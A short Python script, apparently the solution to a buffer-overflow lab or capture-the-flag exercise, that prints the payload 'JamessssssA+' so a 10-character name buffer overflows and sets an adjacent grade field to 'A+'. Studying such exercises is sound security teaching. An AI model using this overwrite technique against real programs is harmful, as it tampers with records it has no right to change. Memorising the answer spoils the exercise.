# sol0.py overflows the 10 character buffer so A+ bleeds into the grade buffer and overwrites the nil value
import sys
sys.stdout.buffer.write(b"JamessssssA+")
